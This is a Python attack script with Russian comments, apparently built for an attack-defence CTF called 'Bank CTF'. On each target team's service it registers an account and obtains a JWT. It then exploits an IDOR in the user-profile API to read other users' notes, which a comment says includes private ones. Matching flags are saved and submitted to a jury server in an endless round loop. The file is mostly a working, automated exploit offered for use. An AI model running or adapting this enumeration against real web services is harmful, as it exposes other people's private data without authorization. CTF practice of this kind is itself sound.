#!/usr/bin/env python3
"""
Bank CTF - Mass Flag Hunter v3.0
Массовый сбор флагов со всех команд

НАСТРОЙКА:
1. Заполни список TARGET_IPS ниже
2. Укажи IP_JURY для отправки флагов
3. Запусти: python3 mass_flag_hunter.py
"""

import requests
import re
import os
import sys
import time
from datetime import datetime
from typing import Set, List, Dict, Optional

# ============================================
# НАСТРОЙКА ЦЕЛЕЙ - ЗАПОЛНИ ЭТОТ СПИСОК
# ============================================
TARGET_IPS = [
    "10.1.15.129"
    # Впиши сюда IP адреса команд для атаки
    # "10.1.15.100",
    # "10.1.15.101", 
    # "10.1.15.102",
    # и т.д.
]

# IP жюри для отправки флагов (укажи когда дадут)
IP_JURY = None  # Например: "10.1.0.1"
SUBMIT_PORT = 8080  # Порт для отправки флагов (уточни у организаторов)

# ============================================
# НАСТРОЙКИ
# ============================================
SUBMITTED_FLAGS_FILE = "submitted_flags.txt"
RESULTS_FILE = "stolen_flags.txt"
USERNAME = "flagbot_master"
PASSWORD = "flag123"

# Паттерн флага: SSL_CTF{22 символа из A-Z0-9=}
FLAG_PATTERN = re.compile(r'SSL_CTF\{[A-Z0-9]{22}=\}', re.IGNORECASE)

# Задержка между атаками (чтобы не забанили)
DELAY_BETWEEN_TARGETS = 1  # секунд

# Интервал между раундами (CTF режим)
ROUND_INTERVAL = 95  # секунд
CTF_MODE = True  # Автозапуск каждые ROUND_INTERVAL секунд


class FlagHunter:
    def __init__(self, target_ip: str):
        self.target_ip = target_ip
        self.base_url = f"http://{target_ip}:5000"
        self.token: Optional[str] = None
        
    def get_token(self) -> bool:
        """Получить JWT токен"""
        try:
            reg_payload = {"username": USERNAME, "password": PASSWORD}
            
            # Регистрация (игнорируем ошибку если уже есть)
            requests.post(
                f"{self.base_url}/api/auth/register", 
                json=reg_payload, 
                timeout=10
            )
            
            # Логин
            r = requests.post(
                f"{self.base_url}/api/auth/login", 
                json=reg_payload, 
                timeout=10
            )
            
            if r.status_code == 200:
                self.token = r.json()['token']
                return True
            else:
                print(f"  [!] Login failed: {r.status_code}")
                return False
                
        except Exception as e:
            print(f"  [!] Auth error: {e}")
            return False
    
    def get_users(self) -> List[Dict]:
        """Получить список пользователей"""
        try:
            r = requests.get(
                f"{self.base_url}/api/users",
                headers={"Authorization": f"Bearer {self.token}"},
                timeout=10
            )
            if r.status_code == 200:
                return r.json()
            return []
        except Exception as e:
            print(f"  [!] Get users error: {e}")
            return []
    
    def get_user_profile(self, username: str) -> Optional[Dict]:
        """Получить профиль пользователя с заметками"""
        try:
            r = requests.get(
                f"{self.base_url}/api/users/{username}",
                headers={"Authorization": f"Bearer {self.token}"},
                timeout=10
            )
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            return None
    
    def extract_flags(self, text: str) -> List[str]:
        """Извлечь флаги из текста"""
        if not text:
            return []
        return FLAG_PATTERN.findall(text)


class FlagSubmitter:
    """Класс для отправки флагов на жюри"""
    
    def __init__(self, jury_ip: str, port: int = 8080):
        self.jury_url = f"http://{jury_ip}:{port}/flags"
        # Альтернативные варианты отправки (уточни у организаторов)
        self.submit_methods = [
            {"url": f"http://{jury_ip}:{port}/api/flag", "method": "post", "field": "flag"},
            {"url": f"http://{jury_ip}:{port}/submit", "method": "post", "field": "flag"},
            {"url": f"http://{jury_ip}:{port}/api/submit", "method": "post", "field": "flag"},
        ]
    
    def submit_flag(self, flag: str) -> bool:
        """Отправить флаг на проверку"""
        if not IP_JURY:
            print(f"    [!] JURY IP not configured, flag not submitted: {flag}")
            return False
        
        for method in self.submit_methods:
            try:
                url = method["url"]
                field = method["field"]
                
                r = requests.post(url, data={field: flag}, timeout=5)
                if r.status_code in [200, 201, 202]:
                    print(f"    [+] Flag submitted successfully: {flag}")
                    return True
                    
            except Exception:
                continue
        
        print(f"    [!] Failed to submit flag: {flag}")
        return False


def load_submitted_flags() -> Set[str]:
    """Загрузить уже отправленные флаги"""
    flags = set()
    if os.path.exists(SUBMITTED_FLAGS_FILE):
        with open(SUBMITTED_FLAGS_FILE, 'r') as f:
            for line in f:
                flag = line.strip()
                if flag:
                    flags.add(flag.upper())  # Нормализуем к верхнему регистру
    return flags


def save_submitted_flag(flag: str):
    """Сохранить отправленный флаг"""
    with open(SUBMITTED_FLAGS_FILE, 'a') as f:
        f.write(f"{flag.upper()}\n")


def save_stolen_flag(target_ip: str, username: str, flag: str, source: str):
    """Сохранить украденный флаг"""
    timestamp = datetime.now().isoformat()
    with open(RESULTS_FILE, 'a') as f:
        f.write(f"[{timestamp}] {target_ip} | {username} | {flag} | {source}\n")


def attack_target(target_ip: str, submitted_flags: Set[str], submitter: FlagSubmitter) -> List[str]:
    """Атаковать одну цель"""
    print(f"\n{'='*60}")
    print(f"[+] Attacking {target_ip}")
    print(f"{'='*60}")
    
    hunter = FlagHunter(target_ip)
    new_flags = []
    
    # Аутентификация
    print("[*] Authenticating...")
    if not hunter.get_token():
        print("[-] Auth failed, skipping...")
        return new_flags
    
    print(f"[+] Token acquired")
    
    # Получаем пользователей
    print("[*] Getting users list...")
    users = hunter.get_users()
    print(f"[+] Found {len(users)} users")
    
    for user in users:
        username = user['username']
        print(f"\n  [*] Checking user: {username}")
        
        # Получаем профиль
        profile = hunter.get_user_profile(username)
        if not profile:
            print(f"    [!] No profile data")
            continue
        
        # Ищем флаги в заметках (IDOR - получаем даже private notes!)
        recent_notes = profile.get('recent_notes', [])
        
        if recent_notes:
            for note in recent_notes:
                title = note.get('title', '')
                body = note.get('body', '')
                
                text_to_check = title + ' ' + body
                flags = hunter.extract_flags(text_to_check)
                
                for flag in flags:
                    flag_upper = flag.upper()
                    if flag_upper not in submitted_flags:
                        print(f"    🚩 NEW FLAG from {username}: {flag}")
                        
                        new_flags.append(flag)
                        submitted_flags.add(flag_upper)
                        save_submitted_flag(flag)
                        save_stolen_flag(target_ip, username, flag, f"note:{note.get('id')}")
                        submitter.submit_flag(flag)
        
        # Также проверяем display_name
        display_name = profile.get('user', {}).get('display_name', '')
        if display_name:
            flags = hunter.extract_flags(display_name)
            for flag in flags:
                flag_upper = flag.upper()
                if flag_upper not in submitted_flags:
                    print(f"    🚩 NEW FLAG in display_name from {username}: {flag}")
                    new_flags.append(flag)
                    submitted_flags.add(flag_upper)
                    save_submitted_flag(flag)
                    save_stolen_flag(target_ip, username, flag, "display_name")
                    submitter.submit_flag(flag)
    
    print(f"\n[+] Found {len(new_flags)} new flags from {target_ip}")
    return new_flags


def print_summary(all_flags: List[str], submitted_flags: Set[str]):
    """Вывести итоги"""
    print(f"\n{'='*60}")
    print("[+] ATTACK SUMMARY")
    print(f"{'='*60}")
    print(f"[+] New flags this run: {len(all_flags)}")
    print(f"[+] Total unique flags: {len(submitted_flags)}")
    
    if all_flags:
        print(f"\n[+] All new flags:")
        for flag in all_flags:
            print(f"    {flag}")
    
    print(f"{'='*60}")


def run_attack_round(submitted_flags: Set[str], submitter: FlagSubmitter) -> List[str]:
    """Один раунд атаки"""
    print(f"\n{'#'*60}")
    print(f"# ROUND STARTED: {datetime.now().isoformat()}")
    print(f"{'#'*60}")
    
    all_new_flags = []
    
    for target_ip in TARGET_IPS:
        try:
            flags = attack_target(target_ip, submitted_flags, submitter)
            all_new_flags.extend(flags)
            
            if target_ip != TARGET_IPS[-1]:
                time.sleep(DELAY_BETWEEN_TARGETS)
                
        except Exception as e:
            print(f"[!] Error attacking {target_ip}: {e}")
    
    print_summary(all_new_flags, submitted_flags)
    return all_new_flags


def main():
    print(f"\n{'#'*60}")
    print("# BANK CTF - MASS FLAG HUNTER v3.0")
    print(f"{'#'*60}")
    
    # Проверяем настройки
    if not TARGET_IPS:
        print("\n[!] ERROR: No target IPs configured!")
        print("[!] Edit TARGET_IPS list in the script")
        return 1
    
    if not IP_JURY:
        print("\n[!] WARNING: JURY IP not configured!")
        print("[!] Flags will be saved but not submitted")
    else:
        print(f"\n[*] Jury IP: {IP_JURY}:{SUBMIT_PORT}")
    
    print(f"\n[*] Targets ({len(TARGET_IPS)}):")
    for ip in TARGET_IPS:
        print(f"    - {ip}")
    
    print(f"\n[*] CTF Mode: {'ON' if CTF_MODE else 'OFF'}")
    if CTF_MODE:
        print(f"[*] Round interval: {ROUND_INTERVAL} seconds")
    
    # Загружаем отправленные флаги
    submitted_flags = load_submitted_flags()
    print(f"\n[*] Already submitted flags: {len(submitted_flags)}")
    
    # Создаем submitter
    submitter = FlagSubmitter(IP_JURY, SUBMIT_PORT) if IP_JURY else FlagSubmitter("", 0)
    
    if CTF_MODE:
        # CTF режим: бесконечный цикл каждые ROUND_INTERVAL секунд
        round_num = 0
        try:
            while True:
                round_num += 1
                print(f"\n{'='*60}")
                print(f"[+] ROUND #{round_num}")
                print(f"{'='*60}")
                
                run_attack_round(submitted_flags, submitter)
                
                print(f"\n[*] Sleeping {ROUND_INTERVAL} seconds until next round...")
                time.sleep(ROUND_INTERVAL)
                
        except KeyboardInterrupt:
            print("\n\n[!] Stopped by user")
            return 0
    else:
        # Обычный режим: один прогон
        run_attack_round(submitted_flags, submitter)
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
